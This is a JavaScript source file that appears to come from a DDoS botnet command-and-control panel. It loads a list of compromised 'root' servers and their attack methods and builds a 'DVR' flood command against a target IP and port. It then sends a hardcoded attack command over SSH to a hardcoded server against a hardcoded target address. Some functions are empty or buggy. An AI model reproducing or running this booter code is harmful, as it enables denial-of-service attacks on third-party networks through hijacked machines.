// Modules
const fs = require("fs");
const SSH = require("ssh-exec");

// Files
const dis = require("./ssh.js");

// Extra

exports.GetRoot = function(method) {
    // Getting root to hit with depends if the root has the method!
    let rootDB = fs.readFileSync("./CNC/db/bots/roots.txt", "utf8");
    let roots = rootDB.split('\n');

    let foundcheck = false, foundroot = "";

    roots.forEach(e => {
        if(e.length > 5) {
            if(e.includes(method)) {
                let fix = e.split("('").join("").split("')").join("");
                foundcheck = true;
                if(foundroot == true) {
                    foundroot += "\n" + fix.split("','").join(",");
                } else {
                    foundroot = fix.split("','").join(",");
                }
                console.log(foundroot);
            }
        }
    })

    return (foundcheck ? foundroot:"[x] No root found with this method!");
}

exports.addROOT = function(serverip, serveruser, serverpw, methods) {
    //Check if methods is an array
    
}

exports.MethodValidation = function(method) {
    let rootDB = fs.readFileSync("./CNC/db/bots/roots.txt", "utf8");
    if(rootDB.includes(method + ",") || rootDB.includes("," + method)) {
        return true;
    } else {
        return false;
    }
}

exports.GetCommand = function(ip, port, time, method) {
    switch(method) { 
        case "DVR":
            return "./dvr " + ip + " " + port + " dvr.txt 5 -1 " + time + ";wall 'attack sent'";
    }
}

exports.SendSSHCmd = function(serverip, serveruser, serverpw, cmd) {
    dis.exec('./dvr 70.70.70.72 80 dvr.txt 5 -1 70; wall skid', {
        user: 'gang',
        host: '194.34.134.15',
        key: "",
        password: ''
      })
}

exports.rootCOUNT = function() {
    return fs.readFileSync("./CNC/db/bots/roots.txt", "utf8").split("\n").length;
}